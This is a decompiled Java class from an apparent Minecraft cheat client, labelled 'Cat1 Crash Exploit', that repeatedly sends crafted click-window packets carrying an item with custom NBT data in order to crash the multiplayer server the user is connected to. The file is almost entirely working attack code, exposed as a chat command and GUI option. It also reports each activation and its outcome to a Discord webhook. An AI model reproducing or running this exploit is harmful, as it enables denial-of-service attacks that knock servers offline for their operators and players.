package org.jon.magicclient.client.crashers;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.Arrays;
import java.util.List;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2813;
import net.minecraft.class_310;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.MessageHelper;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionType;
import org.jon.magicclient.client.utils.OptionUtil;

public class Cat1 implements Command {
   private boolean enabled = false;
   private final class_310 mc = class_310.method_1551();
   private final MessageHelper msgHelper = new MessageHelper();
   private static final int WINDOW_ID = 0;
   private static final int STATE_ID = 0;
   private static final int SLOT = 36;
   private static final int BUTTON = 0;
   private static final class_1713 WINDOW_CLICK_TYPE;
   private final List<OptionUtil> options;

   public Cat1() {
      this.options = Arrays.asList(new OptionUtil("Packets", OptionType.INTEGER));
      ((OptionUtil)this.options.get(0)).setValue(1);
   }

   public void executeCrash(int packets) {
      System.out.println("Cat1.executeCrash called with packets: " + packets);
      String config = "packets=" + packets;
      DiscordWebhookSender.sendCrasherActivation("Cat1", config);
      if (this.mc.field_1724 != null && this.mc.method_1562() != null) {
         this.enabled = true;
         (new Thread(() -> {
            boolean success = false;

            try {
               this.msgHelper.sendMessage("§a[Cat1] Sending crash packets...", true);
               int sent = 0;

               for(int i = 0; i < packets && this.enabled; ++i) {
                  if (this.mc.field_1724 == null || this.mc.method_1562() == null) {
                     System.out.println("[Cat1] Connection lost during packet sending - stopping");
                     this.msgHelper.sendMessage("§c[Cat1] Stopped - connection lost", true);
                     this.enabled = false;
                     DiscordWebhookSender.sendCrasherCompletion("Cat1", config, false);
                     return;
                  }

                  if (this.mc.field_1724 != null && this.mc.field_1724.field_3944 != null) {
                     try {
                        this.sendClickWindowPacket();
                        ++sent;
                     } catch (Exception var11) {
                     }
                  }

                  if (i % 10 == 0) {
                     Thread.sleep(50L);
                  }
               }

               this.msgHelper.sendMessage("§a[Cat1] Sent " + sent + " crash packets", true);
               success = true;
            } catch (Exception var12) {
               this.msgHelper.sendMessage("§c[Cat1] Error: " + var12.getMessage(), true);
               success = false;
            } finally {
               this.enabled = false;
               this.msgHelper.sendMessage("§a[Cat1] Attack finished!", true);
               DiscordWebhookSender.sendCrasherCompletion("Cat1", config, success);
            }

         }, "Cat1-Thread")).start();
      } else {
         this.msgHelper.sendMessage("§c[Cat1] Not connected to server!", true);
         this.enabled = false;
         DiscordWebhookSender.sendCrasherCompletion("Cat1", config, false);
      }
   }

   public String getName() {
      return "Cat1";
   }

   public boolean getEnabled() {
      return this.enabled;
   }

   public void setEnabled(boolean bool) {
      this.enabled = bool;
   }

   public void onCommand(String[] args) {
      System.out.println("Cat1.onCommand called with args: " + Arrays.toString(args));
      int packets;
      if (args.length == 0 || args.length == 1 || args.length >= 2 && (args[1] == null || args[1].isEmpty())) {
         try {
            packets = Integer.parseInt(((OptionUtil)this.options.get(0)).getValue().toString());
            System.out.println("Starting Cat1 from GUI: packets=" + packets);
            this.executeCrash(packets);
            return;
         } catch (Exception var4) {
            this.msgHelper.sendMessage("&cError applying options: " + var4.getMessage(), true);
            var4.printStackTrace();
         }
      }

      if (args.length < 2) {
         this.msgHelper.sendMessage("&7Usage: !cat1 <packets>", true);
      } else {
         try {
            packets = Integer.parseInt(args[1]);
            this.executeCrash(packets);
         } catch (NumberFormatException var3) {
            this.msgHelper.sendMessage("&cInvalid number provided!", true);
         }

      }
   }

   public String getArgsUsage() {
      return "<packets>";
   }

   public String getDescription() {
      return "Cat1 Crash Exploit";
   }

   public List<OptionUtil> getOptions() {
      return this.options;
   }

   public GuiCategory getCategory() {
      return GuiCategory.CRASHES;
   }

   private void sendClickWindowPacket() {
      if (this.mc.field_1724 != null && this.mc.field_1724.field_3944 != null) {
         try {
            class_1799 acaciaPlanks = new class_1799(class_1802.field_8651, 1);
            class_2487 nbt = new class_2487();
            nbt.method_10569("custom_data", 0);
            acaciaPlanks.method_7980(nbt);
            Int2ObjectOpenHashMap<class_1799> slots = new Int2ObjectOpenHashMap();
            slots.put(36, acaciaPlanks);
            class_2813 packet = new class_2813(0, 0, 36, 0, WINDOW_CLICK_TYPE, acaciaPlanks, slots);
            this.mc.field_1724.field_3944.method_2883(packet);
         } catch (Exception var5) {
            System.err.println("Error sending CLICK_WINDOW packet: " + var5.getMessage());
         }

      }
   }

   static {
      WINDOW_CLICK_TYPE = class_1713.field_7790;
   }
}
